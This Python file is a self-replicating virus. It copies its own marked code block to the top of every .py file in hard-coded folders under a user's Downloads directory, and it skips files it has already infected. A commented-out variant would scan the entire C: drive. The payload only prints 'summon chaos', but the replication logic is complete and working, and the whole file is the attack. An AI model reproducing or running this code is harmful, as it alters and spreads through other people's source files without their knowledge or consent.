# begin-00e8ca287054a0950cce47e47d341d79
import glob
import os
import hashlib
def search_in_directories(directories, file_extension=".py"):
    search_results = []
    for directory in directories:
        for root, dirs, files in os.walk(directory, topdown=True, onerror=lambda e: None):
            for file in files:
                if file.endswith(file_extension):
                    search_results.append(os.path.join(root, file))
  
    return search_results

"""
# this is the code to search in the whole drive

def search_windows(file_extension=".py", drive="C:\\"):
    search_results = []
    for root, dirs, files in os.walk(drive, onerror=lambda e: None):  # Skip inaccessible directories
        for file in files:
            if file.endswith(file_extension):
                search_results.append(os.path.join(root, file))

    return search_results
"""
def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file,hash):
    data = get_content_of_file(file)
    for line in data:
        if hash in line:
            return None
    return data

def infect(file, virus_code):
    hash =  hashlib.md5(file.encode("utf-8")).hexdigest()

    if (data:=get_content_if_infectable(file,hash)):
        viral_vector = "".join(virus_code[1:-1])
        with open(file, "w") as infected_file:
            infected_file.write("\n# begin-"+ hash + "\n" + viral_vector + "\n# end-" + hash + "\n")
            infected_file.writelines(data)

def get_virus_code():

    virus_code_on = False
    virus_code = []
    virus_hash = hashlib.md5(__file__.encode("utf-8")).hexdigest()
    print(virus_hash)
    code = get_content_of_file(__file__)
   
    for line in code:
        if "# begin-" + virus_hash in line:
            virus_code_on = True
        if virus_code_on:
            virus_code.append(line)
        if "# end-" + virus_hash in line:
            virus_code_on = False
            break

        
  
    return virus_code

def summon_chaos():
    print("summon chaos")


try:
    virus_code = get_virus_code() 
    dir = ['c:\\Users\\wensal\\Downloads\\test','c:\\Users\\wensal\\Downloads\\virus\\test']
    for file in search_in_directories(dir):
        infect(file, virus_code)

    summon_chaos()
except Exception as e:
    print(e)
# end-00e8ca287054a0950cce47e47d341d79


    